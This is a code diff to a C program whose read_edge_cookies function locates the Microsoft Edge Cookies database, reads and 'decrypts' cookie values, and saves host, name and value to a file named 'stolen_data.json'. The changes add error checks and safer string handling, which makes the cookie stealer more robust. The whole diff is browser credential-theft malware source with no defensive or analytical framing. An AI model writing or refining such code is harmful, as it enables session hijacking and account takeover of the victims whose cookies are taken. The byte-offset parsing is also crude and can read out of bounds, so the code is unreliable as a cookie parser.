@@ -38,8 +38,16 @@ char* decrypt_edge_data(const unsigned char* encrypted_value, int encrypted_len)
 }
 
 void read_edge_cookies() {
-    const char* db_path = getenv("LOCALAPPDATA");
-    strcat(db_path, "\\Microsoft\\Edge\\User Data\\Default\\Cookies");
+    const char* localAppData = getenv("LOCALAPPDATA");
+    if (!localAppData) {
+        printf("Failed to get LOCALAPPDATA environment variable.\n");
+        return;
+    }
+
+    char db_path[1024];
+    snprintf(db_path, sizeof(db_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Cookies", localAppData);
+
+    printf("Cookies file path: %s\n", db_path);
 
     FILE* file = fopen(db_path, "rb");
     if (!file) {
@@ -52,35 +60,45 @@ void read_edge_cookies() {
     fseek(file, 0, SEEK_SET);
 
     unsigned char* buffer = (unsigned char*)malloc(file_size);
+    if (!buffer) {
+        printf("Failed to allocate memory for buffer.\n");
+        fclose(file);
+        return;
+    }
+
     fread(buffer, 1, file_size, file);
     fclose(file);
 
     FILE* output_file = fopen("stolen_data.json", "w");
-    if (output_file) {
-        fprintf(output_file, "[\n");
-        int first = 1;
-        for (long i = 0; i < file_size; i++) {
-            if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x00 && buffer[i + 3] == 0x00) {
-                const char* host_key = (const char*)&buffer[i + 4];
-                const char* name = (const char*)&buffer[i + 20];
-                const unsigned char* encrypted_value = &buffer[i + 40];
-                int encrypted_len = 16;
+    if (!output_file) {
+        printf("Failed to open output file.\n");
+        free(buffer);
+        return;
+    }
 
-                char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
-                if (decrypted_value) {
-                    if (!first) {
-                        fprintf(output_file, ",\n");
-                    }
-                    first = 0;
-                    fprintf(output_file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
-                    free(decrypted_value);
+    fprintf(output_file, "[\n");
+    int first = 1;
+    for (long i = 0; i < file_size; i++) {
+        if (buffer[i] == 0x00 && buffer[i + 1] == 0x00 && buffer[i + 2] == 0x00 && buffer[i + 3] == 0x00) {
+            const char* host_key = (const char*)&buffer[i + 4];
+            const char* name = (const char*)&buffer[i + 20];
+            const unsigned char* encrypted_value = &buffer[i + 40];
+            int encrypted_len = 16;
+
+            char* decrypted_value = decrypt_edge_data(encrypted_value, encrypted_len);
+            if (decrypted_value) {
+                if (!first) {
+                    fprintf(output_file, ",\n");
                 }
+                first = 0;
+                fprintf(output_file, "  {\n    \"host\": \"%s\",\n    \"name\": \"%s\",\n    \"value\": \"%s\"\n  }", host_key, name, decrypted_value);
+                free(decrypted_value);
             }
         }
-        fprintf(output_file, "\n]\n");
-        fclose(output_file);
-        printf("Data saved locally at stolen_data.json\n");
     }
+    fprintf(output_file, "\n]\n");
+    fclose(output_file);
+    printf("Data saved locally at stolen_data.json\n");
 
     free(buffer);
 }
